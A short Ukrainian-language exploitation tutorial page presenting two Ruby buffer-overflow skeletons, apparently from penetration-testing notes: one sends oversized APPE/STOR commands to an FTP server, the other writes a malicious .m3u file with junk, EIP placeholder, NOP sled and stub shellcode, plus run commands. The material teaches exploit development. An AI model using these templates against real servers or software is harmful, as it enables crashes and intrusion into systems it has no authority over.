# Модуль 0x5 | Експлуатаційне Кунг-фу

## Основа експлойту

Мати під рукою скелетон експлойту є дуже правильною ідеєю, оскільки такий скелетон можна в будь-який момент швидко застосувати під час атаки.

### Базовий код для мереж 

```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
require 'socket'

buffer = "A" * 2000

#--> Networking
host = ARGV[0]
port = ARGV[1] || 21

s = TCPSocket.open(host, port)
s.recv(1024)
puts "[+] Sending Username."
s.send("USER ftp\r\n", 0)
s.recv(1024)
puts "[+] Sending Password."
s.send("PASS ftp\r\n", 0)
s.recv(1024)
puts "[+] Sending Evil buffer..."
s.send("APPE " + buffer + "\r\n", 0)
total = s.send("STOR " + buffer + "\r\n", 0)
#--> Exploit Info
puts "[+] " + "Total exploit size: " + "#{total} bytes."
puts "[+] " + " Buffer length: " + "#{buffer.size} bytes."
puts "[+] Done"

s.close
```
Аби запустити, виконайте наступну команду:
```
ruby ftp_exploit.rb [TARGET] [PORT]
```
Зверніть увагу на те, що деякі сервіси мають отримувати данні зі скрипта, а деякі ні.

### Простий базовий файл для експлойту

Створення простого простого файду для експлойту. 

```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI

file = ARGV[0] || "exploit.m3u"

junk  = "A" * 2000
eip   = "B" * 4
nops  = "\x90" * 8
shell = "S" * 368
exploit = junk + eip + nops + shell

File.open(file, 'w') {|f| f.write(exploit)}
puts "[*] Exploit size: #{exploit.size}"
```
Аби запустити, виконайте наступну команду:
```
ruby m3u_exploit.rb song1.m3u
```

<br><br><br>
---
